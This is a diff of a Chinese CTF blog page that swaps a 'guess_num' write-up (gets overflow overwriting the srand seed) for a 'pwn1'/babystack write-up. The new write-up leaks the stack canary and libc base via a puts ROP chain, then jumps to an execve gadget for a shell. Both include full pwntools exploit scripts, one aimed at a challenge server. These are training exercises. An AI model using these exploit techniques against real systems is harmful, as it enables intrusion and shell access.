@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="攻防世界pwn-guess_num, 小哑师兄">
+    <meta name="keywords" content="攻防世界pwn-pwn1, 小哑师兄">
     <meta name="description" content="将登太行雪满山">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -27,7 +27,7 @@
 </script>
 
 
-    <title>攻防世界pwn-guess_num | 小哑师兄</title>
+    <title>攻防世界pwn-pwn1 | 小哑师兄</title>
     <link rel="icon" type="image/jpeg" href="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/avatar.jpg">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -322,12 +322,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/wallhaven-p97wgp.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/wallhaven-gpm88q.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">攻防世界pwn-guess_num</h1>
+                    <h1 class="description center-align post-title">攻防世界pwn-pwn1</h1>
                 </div>
             </div>
         </div>
@@ -374,7 +374,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-08-01
+                    2023-09-02
                 </div>
                 
 
@@ -383,14 +383,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    288
+                    523
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    2 分
                 </div>
                 
 
@@ -413,49 +413,53 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>通过IDA打开附件后，其中有srand随机数函数，当随机数种子变时，无论生成多少次随机数，所产生的随机数序列都是相同的。<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230714100108.png" style="zoom:50%;" /></p>
-<p>使用gets()函数进行处理，可以进行溢出，且输入和seed在栈空间中是连续的，在输入时，覆盖到seed[0] 即可</p>
-<img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230714141012.png" style="zoom:50%;" />
-gets获取到的输入与seed数组在栈中是连续的，gets长度为32，因此构造payload为
-
-<pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">32</span> <span class="token operator">+</span> <span class="token string">b'1000'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>其中“1000”，是设置的随机数种子，在输入过程中，“1000”是按字符形式读取的，所以在生成时该数为“0x30303031”</p>
-<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;time.h></span></span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;cstdlib></span></span>
-
-<span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>
-  
-<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token number">0x30303031u</span><span class="token punctuation">;</span>
-    <span class="token function">srand</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
-    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-        <span class="token keyword">int</span> number <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
-        cout<span class="token operator">&lt;&lt;</span>number<span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token comment">//在Linux下进行编译</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>生成随机数：6235463161</p>
-<p>python脚本</p>
+                <p>最后完成于2023年9月2日<br>checksec检查<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230817212438.png" alt="image.png" style="zoom:50%;" /><br>除了PIE外所有保护全开.<br>程序的大致逻辑是一个输入输出, 先将输入存储到缓冲区, 然后再输出<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230902210031.png" alt="image.png" style="zoom:50%;" /></p>
+<p>IDA打开后程序的主逻辑如下:<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230902210914.png" alt="image.png" style="zoom:50%;" /><br>程序中没有发现<code>system</code>函数以及<code>bin/sh</code>等, 只有<code>read</code>, <code>puts</code>, <code>write</code>. 附件中给出了<code>libc</code>, <code>libc</code>中有可利用的<code>execve</code><br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230902211303.png" alt="image.png" style="zoom:50%;" /><br>大致思路是要通过主程序去泄漏出<code>libc</code>的基地址, 然后通过libc中的<code>execve</code>去get shell.<br>因为开启了canary, 首先要去找到canary的值, 由于输入值和canary的值在栈中相邻, 因此可以通过puts函数泄漏出canray的值.<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230902212752.png" alt="image.png" style="zoom:50%;" /><br>可以第一步输入<code>&#39;a&#39; * 0x88</code>, 然后第二步输出时泄漏canary的地址. 但是因为在发送<code>&#39;a&#39; * 0x88</code>时会在末尾追加<code>\n</code>, 因此会将canary低位的<code>\x00</code>覆盖掉, 所以还要还原.<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230902214043.png" alt="image.png" style="zoom:50%;" /><br>在得到canary的值后, 就需要去泄漏出libc的基地址. 因为程序中有使用到<code>puts</code>函数, 所以通过调用<code>puts</code>函数去计算出<code>puts</code>函数的地址, 然后通过<code>plt</code>, <code>got</code>表的调用关系去计算出libc的基地址. 然后再算出运行时<code>execve</code>的地址, 来进行调用.<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230902214739.png" alt="image.png" style="zoom:50%;" /></p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
-<span class="token keyword">from</span> ctypes <span class="token keyword">import</span><span class="token operator">*</span>
+<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span><span class="token operator">*</span>
 
-libc <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>
+context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
 
-context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span>
+  
+<span class="token comment"># sh = process('./babystack')</span>
+sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'61.147.171.105'</span><span class="token punctuation">,</span> <span class="token number">49628</span><span class="token punctuation">)</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./babystack'</span><span class="token punctuation">)</span>
+libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.23.so'</span><span class="token punctuation">)</span>
+execve_addr <span class="token operator">=</span> <span class="token number">0x45216</span>
 
-<span class="token comment">#sh = remote("61.147.171.105", 59395)</span>
+puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
+puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
+read_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>
+read_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>
+write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
+write_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
 
-payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">32</span> <span class="token operator">+</span> <span class="token string">b'1000'</span>
-libc<span class="token punctuation">.</span>srand<span class="token punctuation">(</span><span class="token number">0x30303031</span><span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'name:'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
-<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'number'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>通过ctypes库来调用c函数生成随机数</p>
+main <span class="token operator">=</span> <span class="token number">0x400908</span>
+pop_rdi <span class="token operator">=</span> <span class="token number">0x400A93</span>
 
+sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">,</span><span class="token string">b'1'</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x88</span><span class="token punctuation">)</span> <span class="token comment">#通过覆盖掉\x00来使得puts泄漏出canary</span>
+sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x88</span> <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>
+canary <span class="token operator">=</span> u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#将末尾的0xa替换回来</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"canary value : 0x%x"</span> <span class="token operator">%</span> canary<span class="token punctuation">)</span>
+
+sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>
+payload_1 <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x88</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span>  p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span> <span class="token comment">#利用puts函数输出puts函数的地址</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload_1<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>
+put_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"puts address : 0x%x"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>put_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+libc_base <span class="token operator">=</span> put_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span> <span class="token comment">#计算基地址</span>
+bin_sh <span class="token operator">=</span> libc_base <span class="token operator">+</span> execve_addr
+
+sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>
+payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x88</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span> <span class="token comment">#跳转到getshell</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
                 
             </div>
             <hr/>
@@ -481,7 +485,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://blog.yangsx.cn/ctf-pwn/a1902526.html">https://blog.yangsx.cn/ctf-pwn/a1902526.html</a>
+                    <a href="https://blog.yangsx.cn/ctf-pwn/1bdd2aa8.html">https://blog.yangsx.cn/ctf-pwn/1bdd2aa8.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -827,9 +831,10 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/ctf-pwn/1bdd2aa8.html">
                     <div class="card-image">
@@ -847,9 +852,9 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-09-02
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-09-02
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -862,6 +867,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -880,13 +886,13 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/ctf-pwn/be50b3b8.html">
+                <a href="/ctf-pwn/a1902526.html">
                     <div class="card-image">
                         
                         
-                        <img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/wallhaven-qzmgjq.jpg" class="responsive-img" alt="攻防世界pwn-forgot">
+                        <img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/wallhaven-p97wgp.png" class="responsive-img" alt="攻防世界pwn-guess_num">
                         
-                        <span class="card-title">攻防世界pwn-forgot</span>
+                        <span class="card-title">攻防世界pwn-guess_num</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -897,7 +903,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-07-26
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-08-01
                             </span>
                         <span class="publish-author">
                             
